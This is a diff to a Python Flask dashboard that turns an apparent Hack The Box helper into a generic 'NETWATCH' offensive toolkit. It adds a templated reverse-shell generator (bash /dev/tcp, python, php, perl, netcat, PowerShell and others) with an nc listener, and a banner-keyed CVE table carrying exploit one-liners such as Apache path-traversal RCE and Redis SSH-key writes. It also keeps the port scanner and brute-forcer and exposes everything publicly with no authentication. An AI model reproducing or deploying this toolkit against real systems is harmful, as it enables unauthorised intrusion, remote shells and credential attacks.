@@ -1,25 +1,55 @@
-from flask import Flask, render_template
+from flask import Flask, render_template, jsonify
 from flask_socketio import SocketIO
 import requests as req
 import threading
+import subprocess
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from threading import Event
 import socket as sock
 import time
 import re
+import os
+import json
 
 app = Flask(__name__)
-app.config['SECRET_KEY'] = 'htbdash-x9k2'
+app.config['SECRET_KEY'] = 'netwatch-x9k2'
 socketio = SocketIO(app, cors_allowed_origins='*', async_mode='threading')
 
+# ── Download Earth texture once on startup ───────────────────
+_STATIC = os.path.join(os.path.dirname(__file__), 'static')
+_EARTH  = os.path.join(_STATIC, 'earth.jpg')
+
+def _fetch_texture():
+    os.makedirs(_STATIC, exist_ok=True)
+    if os.path.exists(_EARTH):
+        return
+    urls = [
+        'https://raw.githubusercontent.com/mrdoob/three.js/r134/examples/textures/land_ocean_ice_cloud_2048.jpg',
+        'https://threejs.org/examples/textures/land_ocean_ice_cloud_2048.jpg',
+    ]
+    for url in urls:
+        try:
+            r = req.get(url, timeout=15)
+            if r.status_code == 200:
+                with open(_EARTH, 'wb') as f:
+                    f.write(r.content)
+                print(f'  [texture] downloaded from {url}')
+                return
+        except Exception:
+            continue
+    print('  [texture] WARNING: could not download Earth texture')
+
+threading.Thread(target=_fetch_texture, daemon=True).start()
+
 # ── State ────────────────────────────────────────────────────
-scan_stop   = Event()
-attack_stop = Event()
+scan_stop     = Event()
+attack_stop   = Event()
 scan_active   = False
 attack_active = False
+listener_proc = None
 
 # ── Port / service data ──────────────────────────────────────
-HTB_PORTS = sorted({
+COMMON_PORTS = sorted({
     21,22,23,25,53,79,80,88,110,111,135,139,143,161,
     389,443,445,465,512,513,514,587,631,636,
     993,995,1080,1099,1433,1521,2049,2121,2375,2376,2379,
@@ -70,10 +100,104 @@ HTTP_PATHS = [
     '/console','/manager','/actuator','/actuator/env',
 ]
 
+# ── CVE / exploit hints keyed by lowercase banner substring ──
+CVE_HINTS = {
+    'openssh 7.4':       ('CVE-2018-10933', 'libssh auth bypass — also try user enum'),
+    'openssh 7.2':       ('CVE-2016-6210',  'Username enumeration via timing'),
+    'openssh 6.6':       ('CVE-2016-6210',  'Username enumeration via timing'),
+    'apache/2.4.49':     ('CVE-2021-41773', 'Path traversal + RCE: curl "http://TARGET/cgi-bin/.%2e/.%2e/bin/sh" -d "echo Content-Type: text/plain; id"'),
+    'apache/2.4.50':     ('CVE-2021-42013', 'Path traversal + RCE (bypass of 2.4.49 fix)'),
+    'apache/2.2':        ('OUTDATED',        'Apache 2.2 EOL — multiple known vulns'),
+    'vsftpd 2.3.4':      ('BACKDOOR',        'Smiley-face backdoor: connect to port 6200'),
+    'proftpd 1.3.5':     ('CVE-2015-3306',  'mod_copy: CPFR/CPTO unauthenticated file copy'),
+    'samba 3.':          ('CVE-2017-7494',   'SambaCry: writable share + named pipe exec'),
+    'werkzeug':          ('DEBUG CONSOLE',   'Python debugger at /console — exec("import os;os.system(...)")'),
+    'phpmyadmin':        ('ENUM',            'Try: root/(empty), root/root, admin/admin'),
+    'tomcat/9':          ('CHECK',           'Manager at /manager/html — try tomcat:tomcat, admin:admin'),
+    'tomcat/8':          ('CVE-2017-12617',  'PUT method bypass for JSP upload'),
+    'tomcat/7':          ('CVE-2017-12617',  'PUT method bypass for JSP upload'),
+    'weblogic':          ('CVE-2020-14882',  'Unauth RCE: GET /console/css/%252E%252E%252Fconsole.portal'),
+    'jenkins':           ('RCE',             'Groovy script console: /script → exec("id".execute().text)'),
+    'drupal':            ('DRUPALGEDDON',    'droopescan scan drupal -u TARGET, then CVE by version'),
+    'wordpress':         ('ENUM',            'wpscan --url TARGET --enumerate u,p'),
+    'struts2':           ('CVE-2017-5638',   'S2-045: Content-Type OGNL injection'),
+    'jboss':             ('JMX RCE',         '/invoker/JMXInvokerServlet — deploy WAR'),
+    'glassfish':         ('CVE-2011-0807',   '/upload dir traversal for WAR deployment'),
+    'redis':             ('UNAUTH',          'Unauthenticated: config set dir /root/.ssh + SLAVEOF RCE'),
+    'mongodb 2.':        ('UNAUTH',          'No auth by default in MongoDB 2.x'),
+    'elasticsearch':     ('UNAUTH',          'GET /_cat/indices, GET /_all/_search — check for noauth'),
+    'etcd':              ('UNAUTH',          'etcdctl --endpoint=http://TARGET:2379 get / --prefix'),
+    'docker':            ('ESCAPE',          'Unauthenticated Docker API: create privileged container + escape'),
+    'nagios':            ('CVE-2019-15949',  'Nagios XI unauth RCE'),
+    'heartbeat':         ('ELASTIC',         'Check for Heartbeat Elasticsearch plugin'),
+    'php/5':             ('OUTDATED',        'PHP 5.x is EOL — many unpatched deserialization + RCE vulns'),
+    'php/7.0':           ('OUTDATED',        'PHP 7.0 EOL'),
+    'php/7.1':           ('OUTDATED',        'PHP 7.1 EOL'),
+}
+
+def check_cve_hints(text):
+    tl = text.lower()
+    return [(cve, detail) for key, (cve, detail) in CVE_HINTS.items() if key in tl]
+
+# ── Reverse Shell Arsenal ─────────────────────────────────────
+SHELLS = {
+    'bash':       'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
+    'bash_alt':   '/bin/bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
+    'python3':    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
+    'python':     'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
+    'php':        'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");\'',
+    'php_proc':   'php -r \'$sock=fsockopen("{ip}",{port});$proc=proc_open("/bin/sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);\'',
+    'perl':       'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}\'',
+    'ruby':       'ruby -rsocket -e \'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+    'netcat':     'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
+    'nc_e':       'nc -e /bin/sh {ip} {port}',
+    'powershell': '$c=New-Object System.Net.Sockets.TCPClient("{ip}",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()',
+    'awk':        'awk \'BEGIN{s="/inet/tcp/0/{ip}/{port}";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")close(s)}}\' /dev/stdin',
+}
+
+TTY_UPGRADES = [
+    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "python -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "script -qc /bin/bash /dev/null",
+    "# Then: Ctrl+Z  →  stty raw -echo; fg  →  export TERM=xterm",
+]
+
 # ── Routes ───────────────────────────────────────────────────
 @app.route('/')
 def index():
     return render_template('index.html')
+
+@app.route('/api/geoip')
+@app.route('/api/geoip/<path:ip>')
+def geoip(ip=''):
+    try:
+        url = f'http://ip-api.com/json/{ip}' if ip else 'http://ip-api.com/json/'
+        r = req.get(url, timeout=5)
+        return jsonify(r.json())
+    except Exception as e:
+        return jsonify({'error': str(e), 'status': 'fail'}), 500
+
+@app.route('/api/localip')
+def local_ip():
+    ip = '127.0.0.1'
+    tun0 = ''
+    try:
+        s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
+        s.connect(('8.8.8.8', 80))
+        ip = s.getsockname()[0]
+        s.close()
+    except Exception:
+        pass
+    try:
+        out = subprocess.check_output(
+            ['ip', 'addr', 'show', 'tun0'], stderr=subprocess.DEVNULL, text=True
+        )
+        m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', out)
+        if m:
+            tun0 = m.group(1)
+    except Exception:
+        pass
+    return jsonify({'ip': ip, 'tun0': tun0})
 
 # ── Scan ─────────────────────────────────────────────────────
 @socketio.on('start_scan')
@@ -122,8 +246,6 @@ def http_probe(host, port):
     scheme = 'https' if ssl else 'http'
     base = f'{scheme}://{host}:{port}'
     info = {'url': base, 'title': '', 'server': '', 'status': 0, 'paths': [], 'interesting': []}
-
-    # Root
     try:
         r = req.get(base + '/', timeout=5, verify=False, allow_redirects=True)
         m = re.search(r'<title[^>]*>([^<]{1,80})', r.text, re.I)
@@ -131,14 +253,19 @@ def http_probe(host, port):
         info['server'] = r.headers.get('Server', '')[:50]
         info['status'] = r.status_code
         info['cookies']= list(r.cookies.keys())
-        # Note interesting headers
         for h in ('X-Powered-By','X-Generator','X-AspNet-Version','X-Frame-Options'):
             if h in r.headers:
                 info['interesting'].append(f'{h}: {r.headers[h]}')
+        # CVE check on server header + powered-by
+        probe_str = ' '.join([
+            r.headers.get('Server', ''),
+            r.headers.get('X-Powered-By', ''),
+            r.headers.get('X-Generator', ''),
+        ])
+        info['cve_hints'] = [(cve, detail) for cve, detail in check_cve_hints(probe_str)]
     except Exception:
         return info
 
-    # Path probe
     for path in HTTP_PATHS:
         if scan_stop.is_set():
             break
@@ -146,13 +273,10 @@ def http_probe(host, port):
             r2 = req.get(base + path, timeout=2, verify=False, allow_redirects=False)
             if r2.status_code not in (404, 400, 410):
                 info['paths'].append({
-                    'path':   path,
-                    'status': r2.status_code,
-                    'size':   len(r2.content),
+                    'path': path, 'status': r2.status_code, 'size': len(r2.content),
                 })
         except Exception:
             pass
-
     return info
 
 def run_scan(data):
@@ -168,14 +292,13 @@ def run_scan(data):
         scan_active = False
         return
 
-    # Resolve hostname → IP for display
     try:
         ip = sock.gethostbyname(host)
     except Exception:
         ip = host
 
     if port_mode == 'common':
-        ports = HTB_PORTS
+        ports = COMMON_PORTS
     elif port_mode == 'all':
         ports = range(1, 65536)
     else:
@@ -183,7 +306,7 @@ def run_scan(data):
             a, b = port_mode.split('-')
             ports = range(int(a), int(b) + 1)
         except Exception:
-            ports = HTB_PORTS
+            ports = COMMON_PORTS
 
     ports = list(ports)
     total = len(ports)
@@ -191,6 +314,19 @@ def run_scan(data):
     socketio.emit('scan_status', {'state': 'running', 'host': host, 'ip': ip, 'total': total})
     socketio.emit('log', {'msg': f'Target: {host} ({ip})', 'type': 'info'})
     socketio.emit('log', {'msg': f'Scanning {total} ports with {threads} threads...', 'type': 'info'})
+
+    # Geolocate target and broadcast to globe
+    try:
+        geo = req.get(f'http://ip-api.com/json/{ip}', timeout=4).json()
+        if geo.get('status') == 'success':
+            socketio.emit('geo_info', {
+                'lat': geo['lat'], 'lon': geo['lon'],
+                'city': geo.get('city', ''), 'country': geo.get('country', ''),
+                'isp': geo.get('isp', ''), 'ip': ip,
+            })
+            socketio.emit('log', {'msg': f'  GEO: {geo.get("city","?")}, {geo.get("country","?")} — {geo.get("isp","?")}', 'type': 'info'})
+    except Exception:
+        pass
 
     open_ports = []
     scanned    = [0]
@@ -228,20 +364,20 @@ def run_scan(data):
     elapsed = time.time() - t0
     socketio.emit('log', {'msg': f'Port scan done in {elapsed:.1f}s — {len(open_ports)} open', 'type': 'success'})
 
-    # Phase 2: banners + HTTP probe
     if open_ports:
         socketio.emit('log', {'msg': 'Probing services...', 'type': 'info'})
         for pi in sorted(open_ports, key=lambda x: x['port']):
             if scan_stop.is_set():
                 break
             port = pi['port']
-
             banner = grab_banner(host, port)
             if banner:
                 first_line = banner.splitlines()[0][:120]
                 socketio.emit('banner', {'port': port, 'banner': first_line})
                 socketio.emit('log', {'msg': f'  [{port}] {first_line}', 'type': 'info'})
-
+                for cve, detail in check_cve_hints(first_line):
+                    socketio.emit('cve_hint', {'port': port, 'cve': cve, 'detail': detail})
+                    socketio.emit('log', {'msg': f'  ⚡ [{port}] {cve} — {detail}', 'type': 'warn'})
             is_web = (port in WEB_PORTS or
                       'http' in pi['service'].lower() or
                       'HTTP' in banner.upper()[:50])
@@ -251,6 +387,9 @@ def run_scan(data):
                 socketio.emit('http_found', {'port': port, 'info': info})
                 if info['title']:
                     socketio.emit('log', {'msg': f'  [{port}] Title: "{info["title"]}"', 'type': 'info'})
+                for cve, detail in info.get('cve_hints', []):
+                    socketio.emit('cve_hint', {'port': port, 'cve': cve, 'detail': detail})
+                    socketio.emit('log', {'msg': f'  ⚡ [{port}] {cve} — {detail}', 'type': 'warn'})
                 for p in info['paths']:
                     c = 'hit' if p['status'] in (200, 301, 302) else 'warn'
                     socketio.emit('log', {'msg': f'  [{port}] {p["path"]}  →  {p["status"]}  ({p["size"]}b)', 'type': c})
@@ -317,6 +456,83 @@ def on_preset(data):
     name = data.get('name','')
     socketio.emit('preset_data', {'name': name, 'words': PRESETS_SERVER.get(name, [])})
 
+@socketio.on('get_shells')
+def on_get_shells(data):
+    ip   = data.get('ip', '').strip()
+    port = str(data.get('port', '4444')).strip()
+    payloads = {}
+    for name, tmpl in SHELLS.items():
+        payloads[name] = tmpl.replace('{ip}', ip).replace('{port}', port)
+    socketio.emit('shell_payloads', {'payloads': payloads, 'tty': TTY_UPGRADES})
+
+@socketio.on('start_listener')
+def on_start_listener(data):
+    global listener_proc
+    port = str(data.get('port', '4444'))
+    if listener_proc and listener_proc.poll() is None:
+        socketio.emit('log', {'msg': 'Listener already running — stop it first', 'type': 'warn'})
+        return
+    try:
+        listener_proc = subprocess.Popen(
+            ['nc', '-lvnp', port],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            text=True, bufsize=1
+        )
+        socketio.emit('listener_status', {'state': 'running', 'port': port})
+        socketio.emit('log', {'msg': f'nc listener on :{port}  (PID {listener_proc.pid})', 'type': 'success'})
+        def _stream():
+            for line in iter(listener_proc.stdout.readline, ''):
+                socketio.emit('listener_data', {'line': line.rstrip()})
+            socketio.emit('listener_status', {'state': 'stopped'})
+            socketio.emit('log', {'msg': 'Listener closed', 'type': 'warn'})
+        threading.Thread(target=_stream, daemon=True).start()
+    except FileNotFoundError:
+        socketio.emit('log', {'msg': 'nc not found — install netcat', 'type': 'error'})
+    except Exception as e:
+        socketio.emit('log', {'msg': f'Listener error: {e}', 'type': 'error'})
+
+@socketio.on('stop_listener')
+def on_stop_listener():
+    global listener_proc
+    if listener_proc and listener_proc.poll() is None:
+        listener_proc.terminate()
+        socketio.emit('listener_status', {'state': 'stopped'})
+        socketio.emit('log', {'msg': 'Listener killed', 'type': 'warn'})
+
+@socketio.on('http_request')
+def on_http_request(data):
+    method = data.get('method', 'GET').upper()
+    url    = data.get('url', '').strip()
+    hdrs   = parse_headers(data.get('headers', ''))
+    body   = data.get('body', '').strip()
+    follow = data.get('follow', True)
+    if not url:
+        socketio.emit('http_response', {'error': 'No URL specified'})
+        return
+    t0 = time.time()
+    try:
+        r = req.request(
+            method, url, headers=hdrs,
+            data=body or None, timeout=15,
+            verify=False, allow_redirects=follow
+        )
+        ms = round((time.time() - t0) * 1000)
+        try:
+            body_out = json.dumps(r.json(), indent=2)
+        except Exception:
+            body_out = r.text
+        socketio.emit('http_response', {
+            'status':  r.status_code,
+            'reason':  r.reason or '',
+            'ms':      ms,
+            'size':    len(r.content),
+            'url':     r.url,
+            'headers': dict(r.headers),
+            'body':    body_out[:20000],
+        })
+    except Exception as e:
+        socketio.emit('http_response', {'error': str(e)})
+
 def run_attack(data):
     global attack_active
     attack_active = True
@@ -363,7 +579,7 @@ def run_attack(data):
         try:
             if method == 'post':
                 if '=' in body:
-                    form = dict(p.split('=',1) for p in body.split('&') if '='in p)
+                    form = dict(p.split('=',1) for p in body.split('&') if '=' in p)
                     r = session.post(url, data=form, timeout=5, verify=False)
                 else:
                     r = session.post(url, data=body or word, timeout=5, verify=False)
@@ -376,7 +592,6 @@ def run_attack(data):
         elapsed  = time.time() - t0
         rate     = counter[0] / elapsed if elapsed > 0 else 0
         progress = counter[0] / total * 100
-
         hit = False; result = None
 
         if fail_text and fail_text.lower() in r.text.lower():
@@ -426,6 +641,6 @@ def run_attack(data):
 
 
 if __name__ == '__main__':
-    print('\n  HTB DASHBOARD  —  http://localhost:5001')
+    print('\n  NETWATCH  —  http://localhost:5001')
     print('  Public: ssh -R 80:localhost:5001 nokey@localhost.run\n')
     socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
